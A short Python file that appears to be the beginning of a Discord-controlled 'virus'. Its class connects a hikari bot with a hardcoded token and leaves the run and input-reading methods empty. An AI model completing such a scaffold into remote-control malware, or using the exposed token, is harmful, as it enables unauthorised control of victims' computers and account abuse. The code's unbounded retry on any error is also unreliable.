import hikari  # installs the import we will need for making the bot


class mainVirus:  # Making a class to wrap code cause organisation
    def __init__(self):  # initialisation function
        self.bot = None

    def run(self):  # runs the program
        pass

    def make_connection(self):  # makes a connection to the discord servers
        try:  # I use a try method cause the person might not have an internet connection when computer booted
            self.bot = hikari.GatewayBot(token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY")  # I connect the bot to the discord servers using our bots token
        except: # what to do if connection fails
            self.make_connection()  # I run the program again if the connection fails

    def readInput(self):
        pass
